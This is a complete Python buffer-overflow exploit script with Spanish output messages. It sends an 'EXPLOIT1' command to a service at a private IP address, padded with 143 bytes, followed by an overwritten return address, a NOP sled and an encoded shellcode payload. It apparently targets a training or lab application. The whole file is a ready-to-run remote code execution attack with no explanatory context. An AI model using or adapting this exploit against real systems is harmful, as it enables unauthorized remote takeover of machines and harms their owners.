#!/usr/bin/env python3
import sys
import socket
from struct import pack

host = "192.168.15.4"
port = 7274
offset = b"A" * 143
eip = pack('<L', 0x7274146F)
buf = b""
buf += b"\xba\xc0\xe5\xbf\xa9\xd9\xc4\xd9\x74\x24\xf4\x5d"
buf += b"\x31\xc9\xb1\x52\x83\xed\xfc\x31\x55\x0e\x03\x95"
buf += b"\xeb\x5d\x5c\xe9\x1c\x23\x9f\x11\xdd\x44\x29\xf4"
buf += b"\xec\x44\x4d\x7d\x5e\x75\x05\xd3\x53\xfe\x4b\xc7"
buf += b"\xe0\x72\x44\xe8\x41\x38\xb2\xc7\x52\x11\x86\x46"
buf += b"\xd1\x68\xdb\xa8\xe8\xa2\x2e\xa9\x2d\xde\xc3\xfb"
buf += b"\xe6\x94\x76\xeb\x83\xe1\x4a\x80\xd8\xe4\xca\x75"
buf += b"\xa8\x07\xfa\x28\xa2\x51\xdc\xcb\x67\xea\x55\xd3"
buf += b"\x64\xd7\x2c\x68\x5e\xa3\xae\xb8\xae\x4c\x1c\x85"
buf += b"\x1e\xbf\x5c\xc2\x99\x20\x2b\x3a\xda\xdd\x2c\xf9"
buf += b"\xa0\x39\xb8\x19\x02\xc9\x1a\xc5\xb2\x1e\xfc\x8e"
buf += b"\xb9\xeb\x8a\xc8\xdd\xea\x5f\x63\xd9\x67\x5e\xa3"
buf += b"\x6b\x33\x45\x67\x37\xe7\xe4\x3e\x9d\x46\x18\x20"
buf += b"\x7e\x36\xbc\x2b\x93\x23\xcd\x76\xfc\x80\xfc\x88"
buf += b"\xfc\x8e\x77\xfb\xce\x11\x2c\x93\x62\xd9\xea\x64"
buf += b"\x84\xf0\x4b\xfa\x7b\xfb\xab\xd3\xbf\xaf\xfb\x4b"
buf += b"\x69\xd0\x97\x8b\x96\x05\x37\xdb\x38\xf6\xf8\x8b"
buf += b"\xf8\xa6\x90\xc1\xf6\x99\x81\xea\xdc\xb1\x28\x11"
buf += b"\xb7\x7d\x04\x16\x42\x16\x57\x28\x5d\xba\xde\xce"
buf += b"\x37\x52\xb7\x59\xa0\xcb\x92\x11\x51\x13\x09\x5c"
buf += b"\x51\x9f\xbe\xa1\x1c\x68\xca\xb1\xc9\x98\x81\xeb"
buf += b"\x5c\xa6\x3f\x83\x03\x35\xa4\x53\x4d\x26\x73\x04"
buf += b"\x1a\x98\x8a\xc0\xb6\x83\x24\xf6\x4a\x55\x0e\xb2"
buf += b"\x90\xa6\x91\x3b\x54\x92\xb5\x2b\xa0\x1b\xf2\x1f"
buf += b"\x7c\x4a\xac\xc9\x3a\x24\x1e\xa3\x94\x9b\xc8\x23"
buf += b"\x60\xd0\xca\x35\x6d\x3d\xbd\xd9\xdc\xe8\xf8\xe6"
buf += b"\xd1\x7c\x0d\x9f\x0f\x1d\xf2\x4a\x94\x2d\xb9\xd6"
buf += b"\xbd\xa5\x64\x83\xff\xab\x96\x7e\xc3\xd5\x14\x8a"
buf += b"\xbc\x21\x04\xff\xb9\x6e\x82\xec\xb3\xff\x67\x12"
buf += b"\x67\xff\xad"

esp = b"\x90" * 16
esp += buf
payload = offset + eip + esp

buffer = b"EXPLOIT1 " + payload

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exp.connect((host, port))
print("Enviando Exploit ....")
exp.send(buffer)
exp.close()
